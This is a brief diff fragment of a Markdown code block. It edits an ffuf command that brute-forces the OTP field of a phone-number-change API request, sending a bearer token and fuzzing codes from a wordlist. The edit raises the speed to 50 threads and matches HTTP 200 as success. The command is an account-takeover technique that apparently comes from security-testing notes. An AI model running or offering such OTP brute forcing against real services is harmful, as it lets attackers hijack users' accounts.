@@ -5,5 +5,6 @@ ffuf -w otp.txt:FUZZ \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer YOUR_ACTUAL_TOKEN" \
   -d '{"old_number":"7329493272","new_number":"0823132421","otp":"FUZZ"}' \
-  -mc 200  #status 200 (OK)
+  -mc 200 \ #200 ok
+  -t 50
 ```
